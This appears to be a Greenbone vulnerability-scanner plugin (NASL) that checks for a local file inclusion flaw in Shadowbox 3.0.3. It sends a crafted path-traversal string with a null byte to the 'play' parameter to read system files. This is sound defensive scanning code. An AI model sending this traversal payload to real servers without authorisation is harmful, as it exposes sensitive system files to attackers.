# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804309");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-02-06 21:04:07 +0530 (Thu, 06 Feb 2014)");
  script_name("Shadowbox Local file Inclusion Vulnerability");

  script_tag(name:"summary", value:"shadowbox is prone to local file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is able to read the system file or not");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input to 'play'
  parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to gain sensitive
  information.");

  script_tag(name:"affected", value:"Shadowbox version 3.0.3 and probably prior");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2014020022");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125039/shadowbox-lfi.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/shadowbox-local-file-inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

boxPort = http_get_port(default:80);

if(!http_can_host_php(port:boxPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/media", "/shadowbox", http_cgi_dirs(port:boxPort)))
{

  if(dir == "/") dir = "";

  files = traversal_files();

  foreach file (keys(files))
  {
    url = string(dir + "/plugins/system/shadowbox/min/index.php?g=sb&ad=base&" +
          "lan=en&play=" , crap(data:"..%2f",length:5*15), files[file], "%00");

    if(http_vuln_check(port:boxPort, url:url, pattern:file, extra_check:"Shadowbox.js"))
    {
      security_message(port:boxPort);
      exit(0);
    }
  }
}

exit(99);
